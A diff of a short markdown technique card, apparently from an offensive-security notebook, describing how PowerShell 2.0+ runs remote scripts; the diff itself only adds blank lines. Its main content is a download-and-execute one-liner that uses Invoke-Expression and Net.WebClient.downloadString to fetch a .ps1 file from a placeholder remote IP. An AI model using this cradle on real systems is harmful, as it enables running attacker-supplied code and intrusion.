@@ -32,13 +32,23 @@ PowerShell 2.0+ can execute .ps1 scripts hosted on remote systems using the "Inv
 
 PowerShell 2.0+ can execute .ps1 scripts hosted on remote systems using the "Invoke-Expression" cmdlet. 
 
+
+
 # Instructions
+
+
+
+
 
 **Command** ([[Invoke-Expression (New-Object Net.WebClient).downl]]):
 
 ```bash
 Invoke-Expression (New-Object Net.WebClient).downloadString("http://$_REMOTE_IP/$_FILENAME.ps1")
 ```
+
+
+
+
 
 ## Platforms
 
@@ -63,3 +73,5 @@ Invoke-Expression (New-Object Net.WebClient).downloadString("http://$_REMOTE_IP/
 
 - [[Network]]
 - [[powershell]]
+
+
